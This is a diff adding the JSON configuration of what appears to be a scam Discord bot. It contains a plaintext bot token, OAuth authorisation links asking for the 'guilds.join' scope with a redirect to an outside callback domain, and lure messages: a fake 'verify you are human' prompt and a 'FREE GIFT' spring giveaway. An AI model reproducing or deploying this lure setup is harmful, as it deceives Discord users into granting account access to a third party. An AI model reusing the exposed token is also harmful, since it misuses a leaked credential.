@@ -1,0 +1,14 @@
+{
+  "discord_token": "MTAyMTAwNjY2NjkxNDg1Njk4MQ.GACV1J.aEYwosxOKkerbRlh7mqYHXmVoBLosFLvJTMsuw",
+  "owner_id": 108731110833283072,
+  "button_url_1": "https://discord.com/api/oauth2/authorize?client_id=1056296484473143326&redirect_uri=https%3A%2F%2Foauth.m1000.fr%2Fcallback&response_type=code&scope=identify%20guilds.join&state=%7B%22guild%22%3A%221067555927504453724%22%2C%22bot%22%3A%221056296484473143326%22%7D",
+  "button_url_2": "https://discord.com/api/oauth2/authorize?client_id=1056296484473143326&redirect_uri=https%3A%2F%2Foauth.m1000.fr%2Fcallback&response_type=code&scope=identify%20guilds.join&state=%7B%22guild%22%3A%221067555927504453724%22%2C%22bot%22%3A%221056296484473143326%22%7D",
+  "descrip": "<:6548accountisnotconnected:1055416414242082856> {user.mention}, Let stand! this command is overused I have to verify that you are human for this!",
+  "descrip2": "<:6548accountisnotconnected:1055416414242082856> {user.mention}, Let stand! this command is overused I have to verify that you are human for this!",
+  "img_embed_select_menus": "https://media.discordapp.net/attachments/984193866204860516/1059299662022049802/11111unknown.png",
+  "description_for_select": "We've decided to celebrate the joy's of spring with a **Giveaway Kingdom**! \n\n <:arrowpoint:1068779545869701222> To __claim__ your **FREE GIFT!** select your prize below!<:sa:1068778812365602827>",
+  "color_for_select": 58652,
+  "title_for_select": "<:wumps:1068778641024098344>  Spring is almost here! <:spark:1068778719700852778>",
+  "embed_img2": "https://media.discordapp.net/attachments/984193866204860516/1059299662022049802/11111unknown.png",
+  "embed_img": "https://media.discordapp.net/attachments/984193866204860516/1059299662022049802/11111unknown.png"
+}
